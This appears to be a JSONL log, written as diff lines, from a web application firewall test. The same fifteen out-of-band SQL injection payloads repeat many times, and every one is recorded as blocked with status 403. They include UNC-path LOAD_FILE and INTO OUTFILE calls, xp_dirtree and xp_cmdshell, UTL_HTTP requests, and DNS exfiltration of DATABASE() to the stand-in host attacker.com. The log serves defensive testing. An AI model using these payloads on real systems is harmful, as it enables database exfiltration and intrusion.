+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004053831988130696}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037002110038883984}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035043480020249262}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006913982011610642}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006648414986557327}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0047291680093621835}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006103278006776236}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00436570199963171}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005387452998547815}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00577608599269297}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005645276003633626}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0048754659947007895}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003916357003618032}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004025376008939929}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037340849958127365}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004405829997267574}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005835419986397028}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0052200369973434135}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005221247993176803}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005991800004267134}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005349704995751381}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006202896998729557}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0060112789942650124}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005443917005322874}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005381064998800866}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004819244000827894}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005522948995348997}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005857402007677592}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00615469399781432}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005588194006122649}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004885202011791989}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005525785003555939}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005643589000101201}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006708871005685069}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00489607299095951}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005935132008744404}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006289905999437906}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006174041991471313}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0059818810113938525}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00616632700257469}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007692473998758942}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.010834400003659539}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006116570992162451}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005681884998921305}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006123945000581443}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005494598997756839}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00560175500868354}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005265633997623809}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005576747993472964}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004749733998323791}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005427800002507865}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004274462000466883}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005220332997851074}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005772090997197665}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004885217000264674}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0052203700033714995}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004504869008087553}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0040230930026154965}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004244087991537526}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004289175005396828}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004331627002102323}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0046812289947411045}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00437049099127762}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004430340995895676}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004567313008010387}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0040784279990475625}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036930970090907067}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004137523006647825}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0040697009972063825}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00496939399454277}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0047837559977779165}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004097782002645545}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00455185399914626}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00437170299119316}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005309041996952146}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004585158996633254}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00455964999855496}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00410325700067915}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005434121994767338}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004008403993793763}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00440078999963589}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006314862999715842}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005821217011543922}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006263039002078585}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005988172997604124}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005355194996809587}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005691373007721268}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005572815003688447}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004866395000135526}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004420937999384478}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004974743002094328}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0040683000115677714}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004027160000987351}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004968893001205288}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004580905995680951}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004454241992789321}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0048601540038362145}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004864040995016694}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004694492003181949}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004445294005563483}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004674235999118537}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004942983010550961}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005054057008237578}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00366176399984397}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004334715995355509}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0046243359975051135}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0048535530077060685}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004095049996976741}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004777754991664551}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004566257994156331}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004073338990565389}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0046504549973178655}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004984683997463435}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0041919670038623735}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003947414996218868}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0056697819964028895}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005407245000242256}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004153242989559658}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005963417992461473}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004404362000059336}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004928962996928021}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004869074997259304}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005458122992422432}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004675349002354778}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004927914007566869}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005504693996044807}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006247091994737275}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00571023699012585}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005216789999394678}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005435326995211653}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0047673520020907745}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005300206001265906}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004446316001121886}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004259848996298388}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0061481199954869226}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004841767993639223}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00371445799828507}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003670343998237513}
